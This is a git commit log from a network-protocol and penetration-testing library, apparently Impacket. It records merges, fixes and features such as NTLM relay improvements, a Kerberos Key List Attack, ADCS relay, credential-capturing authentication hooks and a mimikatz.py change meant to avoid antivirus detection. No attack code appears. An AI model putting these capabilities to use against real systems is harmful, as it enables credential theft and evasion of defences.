======================: FILES :======================
======================: BRANCHES :======================
======================: LOGINFO :======================
commit 3c6713e309cae871d685fa443d3e21b7026a2155
Merge: d923c00f bcee97a1
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed Jul 20 10:39:33 2022 -0300

    Merge pull request #1364 from SecureAuthCorp/SSL-methods
    
    Changed the setting up for new SSL connections

commit bcee97a18d73f4dbe54d9e436434bf2ef6c70e9d
Merge: c74caff0 d923c00f
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed Jul 20 10:14:49 2022 -0300

    Merge branch 'master' into SSL-methods

commit c74caff0f2dd91a5be78140358dd30b653f7be6a
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Jul 20 10:08:37 2022 -0300

    Added support for TLS1.0

commit d923c00f75d54b972bca573a211a82f09b55261a
Merge: 0e50fe5f 145e8490
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Jul 19 11:54:10 2022 -0300

    Merge pull request #1369 from p0dalirius/smb-server-auth-hook
    
    [smbserver.py] Added a callback function to incoming authentications

commit 0e50fe5f33acfc47ffabb88ed4bb5138c69f3cbf
Merge: d2a59ca4 cde3d458
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jul 18 18:04:21 2022 -0300

    Merge pull request #1359 from arossert/charset_normalizer
    
    Use charset_normalizer

commit d2a59ca4e32a38c4808282f861e4234cc2fa0ac8
Merge: 424c0bc5 9421672e
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jul 18 17:56:06 2022 -0300

    Merge pull request #1363 from SecureAuthCorp/dc-host-option
    
    Added dc-host option to some example scripts

commit 424c0bc54bc4f3ef1239adac6aa29802ab35366b
Merge: 8b1a99f7 5729662b
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jul 18 17:23:53 2022 -0300

    Merge pull request #1281 from tirkarthi/fix-collections
    
    Import ABC from collections.abc for Python 3.10 compatibility.

commit 145e8490034d4a79cd5e22d33987ce6616e8520a
Author: p0dalirius <podalirius@protonmail.com>
Date:   Sun Jul 17 10:43:53 2022 +0200

    Improved authentication hooking

commit 51b046019d7588426ea116ea90cbe42b658232cc
Author: p0dalirius <podalirius@protonmail.com>
Date:   Sun Jul 17 08:58:56 2022 +0200

    Added possibility of hooking authentication credentials using AuthCallback hook

commit 8b1a99f7c715702eafe3f24851817bb64721b156
Merge: a9bf2cd4 acd17c6c
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Jul 8 21:37:59 2022 -0300

    Merge pull request #1327 from nopernik/master
    
    MS-TSTS Interface Implementation

commit a9bf2cd481bf458715cff63553cbb849de03afce
Merge: f2eb2b65 9c7857a2
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Jul 8 16:55:59 2022 -0300

    Merge pull request #1362 from SecureAuthCorp/ldap-ntlm-negotiate-error
    
    Added error handling in LDAP during NTLM Authentication

commit f2eb2b65ad443f86841a9ac20c92418eaa8aefd4
Merge: ac35841f 16d06b24
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jul 4 18:53:48 2022 -0300

    Merge pull request #1365 from ly4k/new-krb5-error-codes
    
    Add new Kerberos error codes

commit 16d06b2487a80742c6c0492af80cb068300c5260
Author: Oliver Lyak ly4k <53348818+ly4k@users.noreply.github.com>
Date:   Fri Jul 1 01:50:36 2022 +0200

    added new kerberos error codes

commit e10ae8e6549f0d5fbc537582e34b65ed1be45aa0
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Jun 29 17:22:20 2022 -0300

    Updated rdp_check.py
    * Since the pyOpenSSL requirement has been updated, we can now use the dump_publickey() function.

commit 01cae775df2d2ac7f6be4ed27b3885aaed9f3350
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Jun 29 17:18:10 2022 -0300

    Changed the setting up for new SSL connections
    * Modified the SSL context setting. Using TLS_METHOD the protocol version used will be negotiated to the highest version mutually supported by the client and the server
    * Modified cipher list setting. Defining 'ALL:@SECLEVEL=0' enables compatibility with previous versions.
    * Updated pyOpenSSL requirement to >=v21.0.0. This version included the TLS_METHOD definition.

commit 9421672ee635f2746aae5624e67ff47c9be05eba
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Jun 28 23:16:00 2022 -0300

    Improved error handling
    * Added SMB session error handling in getMachineName() (SMB blocked).
    * Added LDAP session error handling in NTLM authentication (NTLM disabled).

commit 5122bcf6b188416d5fb9d0725e099866ab895c9c
Merge: 58fcbf27 f53a8062
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Tue Jun 28 22:46:34 2022 +0200

    Merge pull request #2 from lap1nou/master
    
    Fixed ldap 'SSL routines error'

commit f53a80627507da345a1c6e7a9bc4ab8fd83dd9e3
Author: lap1nou <lapinousexy@gmail.com>
Date:   Tue Jun 28 22:45:46 2022 +0200

    Fixed TLS method

commit 9c7857a25e3adfa12aa2ef097335e5991ca2dacb
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Jun 28 17:34:48 2022 -0300

    Added error handling in LDAP during NTLM Authentication
    
    If NTLM is disabled, the LDAP bind request using NTLM will fail during the NTLM negotiation.

commit a8c45a7a110dc4325075a8c755e7dbb2e8eacea5
Author: lap1nou <lapinousexy@gmail.com>
Date:   Tue Jun 28 20:57:32 2022 +0200

    Fixed ldap 'SSL routines error'

commit cde3d4584e3d5642b1fceaff676f2cd6e88d92f2
Author: Amir Rossert <amir.rossert@safebreach.com>
Date:   Sun Jun 26 15:26:29 2022 +0300

    Use charset_normalizer

commit 181827dda0fbb8af134388afb1bc1e159e2e24e5
Merge: ac35841f cfe14a87
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Jun 24 15:47:40 2022 -0300

    Merge branch 'add-dc-host-option' into dc-host-option
    
    # Conflicts:
    #       examples/GetADUsers.py
    #       examples/GetNPUsers.py
    #       examples/GetUserSPNs.py
    #       examples/findDelegation.py
    #       examples/raiseChild.py

commit 58fcbf27e07b53c3881715419fca72ba7594c5c9
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Thu Jun 23 22:51:29 2022 +0200

    Update tds.py

commit 223ad861b86ab9cf3fc9d07ded10a6ca897b9b11
Merge: ac35841f 55bcbbcf
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Thu Jun 23 10:46:59 2022 +0200

    Merge pull request #1 from mpgn/patch-1
    
    Fix mssql 'SSL routines' error #856

commit 55bcbbcf806fe477a6b7273069fb2a1c54ebfa00
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Thu Jun 23 10:46:06 2022 +0200

    Fix mssql 'SSL routines' error #856
    
    #856
    
    By default, TLS1.0 is not supported anymore when you install a new mssql server (2016/2019)

commit ac35841f0288aabdfa9fb51f6bb6d83ce2618d2d
Merge: 37a44fa9 3e8b252b
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jun 6 12:38:12 2022 -0300

    Merge pull request #1322 from ShutdownRepo/rbcd
    
    [rbcd.py] Updating arguments description

commit 37a44fa961dbddbe81c29e09a16c3e602476a155
Merge: a98b7b97 fa5f661e
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jun 6 11:45:26 2022 -0300

    Merge pull request #1334 from kiwids0220/master
    
    fixing GetUserSPN.py enctype aes128

commit fa5f661e293bb9dd49a1a211afb00f11afc2548c
Author: kiwids <60630639+kiwids0220@users.noreply.github.com>
Date:   Sun Jun 5 19:29:29 2022 -0500

    fixing GetUserSPN.py enctype aes128
    
    Missed a parenthesis so that the output result will not be fully shown

commit acd17c6c2a585944e6b84d391d86d1114410e909
Author: Alexander Korznikov <nopernik@gmail.com>
Date:   Sat Jun 4 21:24:41 2022 +0300

    Changed helper classess & functions structure

commit 1796ae83157bd25e136f4e9c6cd9da7ceb8dffbe
Author: Alexander Korznikov <nopernik@gmail.com>
Date:   Fri Jun 3 17:50:50 2022 +0300

    do_tasklist rewrite

commit c3e0a54f35aa109c51fac0432a624d63c127cda6
Author: Alexander Korznikov <nopernik@gmail.com>
Date:   Fri Jun 3 17:13:49 2022 +0300

    move UUID to the constant section

commit a98b7b97416650cd2a23e480a69be61b65ec2f0a
Author: Colinatorr <69719906+Colinatorr@users.noreply.github.com>
Date:   Mon May 30 20:01:27 2022 +0200

    fix: typo (#1314)

commit e60db5ef6f842ae10de4730f4f04c51faefd5877
Author: Alexander Korznikov <nopernik@gmail.com>
Date:   Fri May 27 09:21:12 2022 +0300

    Minor fix

commit a46a7953c6def42c8c53af439ee49be0fcb82a7b
Author: Alexander Korznikov <nopernik@gmail.com>
Date:   Mon May 23 19:05:07 2022 +0300

    Code Cleanup

commit 8d926abaf2a23be182f7b80a33a8794f8c7b0501
Author: Alexander Korznikov <nopernik@gmail.com>
Date:   Mon May 23 18:18:00 2022 +0300

    MS-TSTS Interface Implementation

commit 3e8b252b03036c4c054836cc81d86c47c032d57a
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Sat May 14 12:43:57 2022 +0200

    Updating arguments description

commit fb1e50c1a90ef19c765efd261fe0722cf766ec95
Merge: d5097759 98238ee2
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri May 13 14:02:33 2022 -0300

    Merge pull request #1320 from ThePirateWhoSmellsOfSunflowers/fix_setuppy
    
    Add dependency in setup.py

commit 98238ee2324bc31be3ebd7ceb7bc9f6c4777e1b3
Author: ThePirateWhoSmellsOfSunflowers <ThePirateWhoSmellsOfSunflowers@users.noreply.github.com>
Date:   Fri May 13 17:58:38 2022 +0200

    add dsinternals

commit d509775976ba37f4eaea630cc511e2fc3b65aba3
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed May 4 12:00:02 2022 -0300

    And going back to dev version

commit 7a18ef5c8b06aac5e36334927789429777382928
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed May 4 11:33:16 2022 -0300

    About to tag a release

commit 678981d28e1cf6b81dd047d3680263ed9d5fa5e3
Merge: 6afc2698 bffca7ec
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue May 3 17:41:39 2022 -0300

    Merge remote-tracking branch 'upstream/master' into master-Impacket

commit 6afc26983791c1e1d97210e8416f2570396cd57c
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue May 3 17:41:24 2022 -0300

    NTLMrelayx: Fixing some issues
    - Fixed multi-relay capability when NTLM negotiation or authentication fails
    - Fixed some typos when logging info

commit bffca7ec5baa536d47c099243e7f965bf0630e69
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue May 3 13:29:08 2022 -0700

    Tests: Fixing more tests on Windows Server 2016 onwards
    
    EVEN, PAR, TSCH and some RPCRT unit tests moved to using PKT_PRIVACY.

commit 46c5439a63478b4ffb72c3fe063d1d88319cab84
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue May 3 10:58:34 2022 -0700

    Tests: Fixing SAMR tests for Windows Server 2016 onwards
    
    Windows Server 2016 and up requires PKT_PRIVACY on remote SAM RPC calls.

commit 0e40593a4e642c17f687cd755a77402704290a2e
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Sun May 1 21:03:24 2022 -0300

    Updated ChangeLog

commit e2a70e22340eef5dc9a38683ce4326de240579ec
Merge: b37fd99d 02c0dbcc
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Sun May 1 20:20:57 2022 -0300

    Merge pull request #1308 from jlvcm/patch-1
    
    Fix typo that made sp_start_job unusable

commit 02c0dbcc77d4a59a16f7fa1824a11e15cee96884
Author: João Melo <joaolvcm@gmail.com>
Date:   Sun May 1 19:34:50 2022 +0100

    fix typo that made sp_start_job unusable
    
    commands are found by prepending the `do_` prefix to the function name, and `sp_start_job` function name is missing the `do_` prefix so it is impossible to call it.

commit b37fd99de4dd657aa4a264af4056e80d8e62eb78
Merge: 95a48050 e85de4e2
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Apr 29 19:21:48 2022 -0300

    Merge pull request #1305 from ThePirateWhoSmellsOfSunflowers/start_tls
    
    Implementing StartTLS

commit 95a48050a4696583f1583cfeac5cc633a041d68e
Merge: 76ec43e7 419ff083
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Apr 28 17:47:22 2022 -0300

    Merge pull request #1303 from SecureAuthCorp/smbserver-smb2_file_both_directory_info
    
    SMBServer: Missed info level for SMB2 FileBothDirectoryInfo

commit e85de4e277359412353f5b8ae0596a452efc4e42
Merge: 76ec43e7 abc6e618
Author: ThePirateWhoSmellsOfSunflowers <ThePirateWhoSmellsOfSunflowers@users.noreply.github.com>
Date:   Thu Apr 28 12:56:28 2022 +0200

    Merge private branch StartTLS into master

commit 76ec43e7c8b2b1cb58060338298ef690de8871c7
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Apr 27 11:44:16 2022 -0700

    Removing travis config file
    
    Now that we completely moved to GitHub Actions, removing the Travis-CI configuration file.

commit f342871b4f98f6e47b64bfe8c0b089986d654779
Merge: c7d352b7 a6cfd909
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Apr 25 21:16:29 2022 -0300

    Merge pull request #1293 from SecureAuthCorp/warning-escape
    
    Removed deprecation warnings due to regex strings

commit a6cfd9099e4a8bb5b114d918162b4f7344050a0b
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Apr 25 09:11:30 2022 -0700

    Fixed regex binary type
    
    Do not mix a string regex with the binary being matched.

commit 419ff0836508162359b73db4026813dda584ef61
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Apr 25 08:56:39 2022 -0700

    SMBServer: Missed info level for SMB2 FileBothDirectoryInfo
    
    The response item was created but not fields were filled in. This should fix #1205.

commit abc6e618a981bb0e31e056135962b16a1a42121c
Author: ThePirateWhoSmellsOfSunflowers <ThePirateWhoSmellsOfSunflowers@users.noreply.github.com>
Date:   Sat Apr 23 15:51:22 2022 +0200

    implementing StartTLS upgrade : first try

commit c7d352b746872c5e28c7a78f7a2d083535e5cbc6
Merge: 701e3a90 6f457bfc
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Apr 22 16:19:48 2022 -0300

    Merge pull request #1210 from SecureAuthCorp/kerb-key-list-attack
    
    Added Kerberos Key List Attack

commit 701e3a907bcddc5dbd5c8d222d9a2ed57dfc0d7d
Merge: 17ae0913 dfaef151
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Apr 22 16:13:39 2022 -0300

    Merge pull request #1300 from 0xdeaddood/remove-py2tests
    
    Removed Python 2.7 tests

commit dfaef151fe18c934c388f2ba2db3684e1c01cb16
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 21 00:04:59 2022 -0300

    Removed Python 2.7 tests

commit 17ae09137fd2e52b7d28cc4538c19fb2a9c89cd6
Merge: 06e5e869 67342473
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed Apr 20 23:46:04 2022 -0300

    Merge pull request #1171 from snovvcrash/smbpasswd-altcreds
    
    Connect to RPC using alternative credentials

commit 06e5e8691416f432692dd962feaa749fef2581f0
Merge: 116ec395 1276e068
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed Apr 20 22:05:18 2022 -0300

    Merge pull request #1294 from RedTeamPentesting/fix_server_challenge_length
    
    Fix default NTLM server challenge in smbserver.py

commit 116ec3955c6af6d915ddb171114a71730a75b5ee
Merge: cab711af 9a38cbcb
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed Apr 20 13:37:36 2022 -0300

    Merge pull request #1296 from mpgn/master
    
    Update mimikatz.py to not trigger the AV on windows

commit cab711af3b6faf59e09488c7f2d756e416eee27e
Merge: 0ca97c1f 67f1cb26
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed Apr 20 11:47:42 2022 -0300

    Merge pull request #1284 from mohemiv/master
    
    Fixing a bug in exchanger.py when a GAL doesn't exist

commit 0ca97c1f696d412b2acbd47670b0ea45138d5f7a
Merge: 68fd6b79 f4bf5e96
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Apr 18 15:43:27 2022 -0300

    Merge pull request #1297 from SecureAuthCorp/ntlmrelayx-refactor
    
    Ntlmrelayx refactor

commit 9a38cbcbc00a31e2ca0397db871b1baae4e8f44d
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Thu Apr 14 11:16:33 2022 +0200

    Update mimikatz.py

commit 6f457bfc207486d0e364ad27b9154095697bd722
Merge: 24106e60 68fd6b79
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Apr 11 17:10:40 2022 -0300

    Merge branch 'master-Impacket' into kerb-key-list-attack
    
    # Conflicts:
    #       examples/secretsdump.py

commit 24106e60b017a1f0c9bcc7139fc3077281febf99
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Apr 11 17:04:24 2022 -0300

    Added error handling and parameter validation, and removed unused code

commit 1276e068a3398da465f157b5441deb58d1ad8010
Author: Jonas Lieb <jonas.lieb@redteam-pentesting.de>
Date:   Fri Apr 8 16:56:45 2022 +0200

    Fix default NTLM server challenge in smbserver.py

commit 68fd6b799f179eed5b3cccfd7cb60850626b0b24
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 7 16:56:53 2022 -0300

    Added some checks related to RRP when use-vss option is enabled in secretsdump.py

commit 54a3afa9a932ca359a6ecfc7ac54ddb3d938b108
Merge: 25a73ded e868dba5
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 7 12:30:50 2022 -0300

    Merge branch 'dpapi-test' into master-Impacket

commit 25a73ded234d7b32c0e89b7545c963963a31f664
Merge: eb283663 4039f5c4
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Apr 7 12:15:05 2022 -0300

    Merge pull request #1203 from w0rmh013/fix_dpapi_entropy
    
    Fixed entropy parameter handling in dpapi.py/unprotect

commit f4bf5e9645d4a9ca5b00586dfeb05bf71d6596a8
Merge: dffa436c e155103e
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Apr 6 19:18:57 2022 -0300

    Merge branch 'capnkrunchy/master' into ntlmrelayx-refactor

commit dffa436c36549baaf8a37e6f22973f087b38eead
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Apr 6 18:37:45 2022 -0300

    Fixed LDAP attack addComputer when no computer name password is defined

commit 8002ff52caee39d0cee7b26e928b303229005ba7
Merge: d372d36f 4e64bb0a
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Apr 6 18:30:00 2022 -0300

    Merge branch 'ldapattack-modified' into ntlmrelayx-refactor

commit e868dba5bcb95b626268770dd9f6f8997d9907d9
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Apr 6 13:52:38 2022 -0700

    DPAPI: Added some simple tests to blob decryption with and without entropy

commit 7e8ee9e0bb999fd647eb02e10afd41db83e6bab0
Merge: 6d3c6b93 eb283663
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Apr 1 08:34:13 2022 -0700

    Merge branch 'master' into warning-escape

commit eb2836630029321f04ae341dd3d1333512a3dce3
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 31 22:49:42 2022 -0300

    Fixed get_padded_options in ImpactPacket.py
    It fixes #1285

commit d372d36fa70fcb7987c023d4a67e3f0883acf0b5
Merge: 9c578a24 6ff2a692
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 31 15:29:34 2022 -0300

    Merge branch 'shadowcredentials' into ntlmrelayx-refactor
    
    # Conflicts:
    #       examples/ntlmrelayx.py
    #       impacket/examples/ntlmrelayx/utils/config.py

commit 6ff2a692ee219a00ecd0686bcda63ec0d7db3b7c
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 31 15:26:21 2022 -0300

    Removed example domain name

commit 9c578a2480d00928c927f44196d4a0813da465c0
Merge: 690a125e 2ab3136c
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 31 12:02:37 2022 -0300

    Merge branch 'ADCS-ESC1/6' into ntlmrelayx-refactor
    
    # Conflicts:
    #       examples/ntlmrelayx.py
    #       impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py
    #       impacket/examples/ntlmrelayx/utils/config.py

commit 690a125ec293525bf4b370e1451a7cc8dbcb3648
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 30 21:27:37 2022 -0300

    Fixed unclosing parentheses

commit ceff76cb742c44c6ef51a52a5571e0cafffb20cd
Merge: c18103d2 b50f37c5
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 30 21:24:18 2022 -0300

    HTTP multi-relay
    Added multi-relay capabilities to the HTTP Relay Server

commit c18103d23b012208fb7be5822b2cfb4dee9c8933
Merge: c2379624 b47715b8
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 30 20:32:12 2022 -0300

    Merge branch 'dumpadcs-once' into ntlmrelayx-refactor

commit c237962425efa0f7de270d607c5053b530c71fb0
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 30 20:15:29 2022 -0300

    HTTP multi-relay
    Added multi-relay capabilities to the HTTP Relay Server

commit a168273cb88ce9f2b6b00e0324352e683c8d78ac
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 30 20:14:01 2022 -0300

    NTLMrelayx: Added a no-multirelay option
    There are some scenarios where the multi-relay approach doesn't work. In those cases, it's very helpful to have an option that disables this capability.
    - Added a no-multirelay flag in ntlmrelayx.py. Modified the smbrelayserver.py flow. This extends PR#1273.
    - Modified the target processing in targetsutils.py

commit ff32269707df18ef672d6e1036ba647331e91c13
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Mar 23 18:04:07 2022 -0300

    Added a very simple workflow to automatically label new PRs (#1286)

commit b47715b8422d1fe735ad0d994003b57090b9fd55
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Wed Mar 23 13:42:00 2022 +0100

    Escape ADCS template names in LDAP query

commit 67f1cb26b5b870f23ff40ad42a6bcd68843c385b
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Wed Mar 23 03:38:26 2022 +0300

    Fixing a bug when the GAL doesn't exist (3)

commit 5297ec64d123100121bd41a1d2cc74b7677bac59
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Wed Mar 23 03:23:41 2022 +0300

    Fixing a bug when the GAL doesn't exist (2)

commit efee5fa62a625c0b2ccf646b4038aa029dc81f8c
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Wed Mar 23 01:48:57 2022 +0300

    Fixing a bug in -lookup-type default value

commit 081d951d715e89928ed8ed4224b5b2e177b48253
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Wed Mar 23 01:16:50 2022 +0300

    Fixing a bug when the GAL doesn't exist

commit 5729662b06c04b7b1324ec0c7e96fc21f53e216d
Author: Karthikeyan Singaravelan <tir.karthi@gmail.com>
Date:   Mon Mar 21 13:23:31 2022 +0000

    Import ABC from collections.abc for Python 3.10 compatibility.

commit b50f37c54ad1a760baf88630f927ccaa5980db78
Merge: 71a7c406 1271d369
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Tue Mar 15 16:22:59 2022 +0100

    merge mainline

commit 71a7c40610a19b3213e55d3dded3599d317163bf
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Tue Mar 15 16:18:55 2022 +0100

    more stable

commit 5986098edff509038189e996c37587c8dec33bd3
Merge: 8c6e2e1b 1271d369
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Mon Mar 14 23:48:26 2022 +0100

    Merge branch 'SecureAuthCorp:master' into dumpadcs-once

commit 461607e3ed92b9fca561f8ebfb67cf3adfb27900
Merge: 1271d369 34e16731
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Mar 11 17:17:42 2022 -0300

    Merge branch 'zblurx/master' into ntlmrelayx-refactor

commit 1271d369e8e31b0e87a7542e454e81300dc3a5d5
Merge: 6042675a 6e288da4
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Mar 11 12:15:50 2022 -0300

    Merge pull request #1276 from SecureAuthCorp/ccache-refactor
    
    CCache refactor

commit 6e288da406e6e14aacb4658856de37d6ccc69e54
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:51:47 2022 -0300

    CCache: Fixed unit tests on 2.7 so no errrors are thrown
    Co-authored-by: Martin Gallo <mgallo@secureauth.com>

commit 8251464dd8a928eb02096a93058b206c954bb8e1
Merge: 2e9b8e3b 1c9624c0
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:40:51 2022 -0300

    Merge branch 'ccache-tests' into ccache-refactor

commit 2e9b8e3bd774da015a0ad7f951448cda5643d54e
Merge: 834557ac 805a0a99
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:37:02 2022 -0300

    Merge branch 'ccache-to-kirbi' into ccache-refactor

commit 834557ac540a10c41feb1ab1f49d24adadf6e241
Merge: 165361a8 ce1017a9
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:34:47 2022 -0300

    Merge branch 'master' into ccache-refactor

commit 165361a83aa8f6e8fbba0e7a8a8c2a035db5c875
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:34:10 2022 -0300

    Updated copyright year

commit 539361973a3faab1189ff1119b8ccc77b1632b28
Merge: 5f39724b 453cec8e
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:28:06 2022 -0300

    Merge branch 'remove-duplicate-code' into ccache-refactor

commit 5f39724bb09fc265618c997be2e93f169cea6300
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:27:48 2022 -0300

    CCache: Minor changes
    - Added NotImplementedError for CCache v1 and v2
    - Added backward compatibility

commit e8440377e4730b98a2576280aa4eaadc1d7c8e44
Merge: 6042675a de0bfa43
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:23:36 2022 -0300

    Merge branch 'reznok/master' into ccache-refactor

commit 453cec8ed2a43700301c7f815c7872c40feaf9fe
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed Mar 9 21:13:03 2022 +0300

    add missing TGT value

commit ec8e97f781a0c68eaf8b294cd89db2da96b933b8
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed Mar 9 21:10:48 2022 +0300

    set the domain parameter as optional in the parseFile function, add the corresponding docstring

commit 382e7c09817de67695c5fd8229a702e86ac2b4a7
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed Mar 9 18:03:17 2022 +0300

    fix the error message in the loadFile function

commit 2cb6ec7618a3b4d2723c7ee6f721cb506beb294a
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed Mar 9 17:56:25 2022 +0300

    add the FileNotFoundError exception

commit 8c6e2e1bbff283cc58c2e7b4faca519d6c938a1e
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Tue Mar 8 18:02:00 2022 +0100

    Only dump ADCS once

commit 6d3c6b93909631e3303937ce62445e8aefd4a9c9
Merge: 275681da 6042675a
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Mar 4 07:54:32 2022 -0800

    Merge branch 'master' into warning-escape

commit 34e1673153c115e606bece143b0589f1657e020d
Merge: 32aea4c9 6042675a
Author: zblurx <68540460+zblurx@users.noreply.github.com>
Date:   Thu Mar 3 22:32:05 2022 +0100

    Merge branch 'SecureAuthCorp:master' into master

commit 673424731d3187a9237d056d1241ce9a97469429
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Feb 26 01:12:05 2022 +0300

    Update commentary

commit 96f5b7fa94b2cc1dfec4245774c16ec00d517895
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Feb 26 00:44:01 2022 +0300

    Add admin flag to smbpasswd.py

commit 805a0a9908062380a19caa0068c458a78aeb199e
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Sun Feb 20 13:44:34 2022 +0100

    Fixing Ccache to Kirbi conversion leaving service hostname out

commit 6042675a6c3632133ad4f932431aa96c5da5de5c
Merge: e84b4407 a699aaa7
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Feb 18 14:09:31 2022 -0300

    Merge pull request #1259 from dirkjanm/patch-1
    
    Remove debug line

commit a699aaa7651f4a99bdaccb836b2bd4a513413709
Author: Dirk-jan <dirkjan@outsidersecurity.nl>
Date:   Fri Feb 18 10:38:14 2022 +0100

    Remove debug line

commit e84b4407cff50802eb04e60106b1521bd9b931f5
Merge: 7d2991d7 9fee58da
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Feb 18 02:28:16 2022 -0300

    Merge pull request #1257 from ShutdownRepo/reg-save
    
    Adding save and backup options to reg.py

commit 7d2991d78836b376452ca58b3d14daa61b67cb40
Merge: 3f61baa3 572fbd4c
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Feb 17 17:07:51 2022 -0300

    Merge pull request #1243 from Maltemo/master
    
    Changing corrupted source link

